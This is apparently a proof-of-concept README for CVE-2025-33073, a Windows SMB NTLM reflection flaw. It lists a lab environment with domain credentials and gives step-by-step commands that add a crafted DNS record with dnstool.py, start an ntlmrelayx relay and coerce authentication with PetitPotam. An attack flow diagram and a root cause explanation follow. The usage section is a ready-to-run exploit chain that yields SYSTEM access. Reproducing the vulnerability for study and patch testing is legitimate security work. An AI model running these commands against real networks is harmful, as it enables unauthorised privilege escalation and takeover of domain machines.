# CVE-2025-33073
Windows SMB Client Elevation of Privilege Vulnerability

# Description
The CVE-2025-33073 vulnerability exists in Windows SMB, allowing authenticated remote attackers to forcelocal authentication reflection on machines without enforced SMB signing by tampering with DNS records, ultimately executing arbitrary commands with SYSTEM privileges.

# Affected Versions
Windows 10 (all versions without KB5048685 or later updates)  
Windows 11 (all versions without KB5048685 or later updates)  
Windows Server 2016/2019/2022 (versions without latest January 2025 security updates)  
Windows Server 2025 (versions without KB5048685)

**Note**: Systems with SMB signing disabled are highly vulnerable.

# Environment Setup

| Role | OS | IP Address | Requirements |
|------|----|-----------|----|
| Domain Controller | Windows Server 2019/2022 | 192.168.2.1 | AD DS + DNS services |
| Target/Victim | Windows 10/11/Server | 192.168.2.3 | Domain-joined |
| Attacker | Kali Linux/Ubuntu | 192.168.2.5 | Penetration tools |

**Domain Configuration**:  
Domain regular user account: test.com\test1  
Password: Test..111  

# Usage

## Step 1: Add Malicious DNS Record  
use dnstool.py  
```bash
python dnstool.py -u 'test.com\test1' -p 'Test..111' -r win10pc1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 192.168.2.5 --action add 192.168.2.1
```

**Parameters**:
- `-u`: Domain credentials (format: `DOMAIN\username`)
- `-p`: User password
- `-r`: DNS record name (prefix + fixed suffix `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`)
- `-d`: Attacker IP (where DNS record points)
- Last argument: DNS server IP (Domain Controller)

## Step 2: Start NTLM Relay Listener
```bash
sudo ntlmrelayx.py -t 192.168.2.3 -smb2support
```

**Parameters**:
- `-t`: Target victim IP
- `-smb2support`: Enable SMB2 protocol support  

## Step 3: Trigger Authentication (Coerce)
```bash
python PetitPotam.py -d test.com -u test1 -p Test..111 win10pc1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 192.168.2.3
```

# Demo

## Attack Flow Diagram
```
[Attacker] --1. Add DNS--> [Domain Controller DNS]
     |                            |
     |                            v
     +--2. Start ntlmrelayx       [Malicious DNS Record]
     |                            |
     +--3. Coerce Auth--> [Target] --4. Auth to Malicious DNS
     |                            |
     +<--5. Relay NTLM------<-----+
     |
     v
[Execute as SYSTEM on Target]
```

## Terminal Output Examples

**Terminal 1 - ntlmrelayx.py**:


**Terminal 2 - PetitPotam.py**:

# Root Cause Analysis

## Technical Details
The vulnerability exists in the Windows SMB client's authentication handling mechanism, specifically in how it validates reflected authentication attempts.

**Key Components**:
1. **DNS Spoofing Layer**: Windows resolves specially crafted DNS records without proper security zone validation
2. **Authentication Reflection**: SMB client accepts relayed authentication from itself when SMB signing is not enforced
3. **Privilege Context**: Relayed machine account authentication grants SYSTEM-level access

**The Attack Vector**:
- Attacker adds DNS record with special suffix that triggers SMB client behavior
- Coercion tool forces target to authenticate to attacker-controlled name
- SMB client resolves malicious DNS, initiates authentication
- Attacker relays authentication back to victim machine
- Victim accepts its own relayed credentials and grants SYSTEM access


# References
- [CVE Record - NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-33073)
- [Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [知乎保姆级复现教程](https://zhuanlan.zhihu.com/p/1918631282335811185)
- [腾讯云技术分析](https://cloud.tencent.com/developer/article/2549783)
- [Revelsi Security Analysis](https://www.revelsi.com/en/blog/cve-2025-33073-privilege-escalation-via-ntlm-reflection-in-windows-smb-client/)
- [Forestall Deep Dive](https://forestall.io/blog/en/active-directory/cve-2025-33073-a-new-technique-for-reflective-ntlm-relay-attack/)
- [Undercode Testing Exploitation Guide](https://undercodetesting.com/exploiting-cve-2025-33073-ntlm-reflection-attack-deep-dive/)
- [Wiz Vulnerability Database](https://www.wiz.io/vulnerability-database/cve/cve-2025-33073)

